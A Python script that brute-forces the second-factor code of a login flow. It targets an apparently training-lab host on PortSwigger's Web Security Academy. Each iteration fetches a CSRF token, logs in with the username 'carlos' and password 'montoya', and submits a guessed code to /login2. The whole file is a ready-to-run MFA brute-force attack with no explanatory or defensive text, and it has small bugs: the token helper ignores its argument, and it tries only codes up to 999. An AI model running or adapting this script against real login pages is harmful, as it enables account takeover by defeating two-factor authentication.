import requests
import time
import sys
import re

hostname = "ac821f8e1e6f18c7c050537900ed0042.web-security-academy.net"

def getCsrfToken(text):
	r = re.search(r'" name="csrf" value="([\d\w]+)', rsp.text)
	csrfToken = r.group(1)
	return csrfToken

for i in range(1,1000):
	# PIN with leeding zero's
	PIN = f'{i:04}'

	s = requests.session()

	# Pre-auth - Get CSRF Token
	print("GET /login")
	rsp = s.get(f"https://{hostname}/login")
	csrfToken = getCsrfToken(rsp.text)

	# Authenticate - using CSRF token
	data = {
		"csrf": csrfToken,
		"username": "carlos",
		"password": "montoya"
	}
	print("POST /login")
	rsp = s.post(f"https://{hostname}/login", data=data)
	csrfToken = getCsrfToken(rsp.text)

	# OTP auth attempt
	print(f"POST /login2 -- OPT code: {PIN}")
	data = {
		"csrf": csrfToken,
		"mfa-code": PIN
	}
	rsp = s.post(f"https://{hostname}/login2", data=data)
	print(rsp.status_code)
	print()

	if rsp.status_code != 200:
		sys.exit()
